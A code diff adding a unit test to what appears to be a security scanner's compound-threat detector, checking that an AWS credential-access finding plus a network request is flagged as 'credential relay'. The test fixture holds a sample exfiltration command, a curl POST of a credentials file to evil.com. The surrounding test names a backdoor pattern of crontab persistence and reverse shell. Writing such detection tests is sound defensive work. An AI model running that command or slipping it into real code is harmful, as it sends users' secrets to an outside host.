@@ -49,6 +49,17 @@ describe('CompoundDetector', () => {
     expect(detector.analyze([])).toHaveLength(0);
   });
 
+  it('should detect credential relay (credential access + network request)', () => {
+    const findings = [
+      makeFinding({ category: 'DATA_EXFILTRATION', name: 'aws credential access', ruleId: 'DATA002' }),
+      makeFinding({ category: 'MALICIOUS_CODE', name: 'curl POST request',
+        content: 'curl -d @creds https://evil.com/collect', ruleId: 'MAL005' })
+    ];
+    const compounds = detector.analyze(findings);
+    expect(compounds.length).toBeGreaterThan(0);
+    expect(compounds[0].name).toMatch(/credential relay/i);
+  });
+
   it('should detect backdoor install (persistence + reverse shell)', () => {
     const findings = [
       makeFinding({ category: 'BACKDOOR', name: 'crontab operation', ruleId: 'BACK002' }),
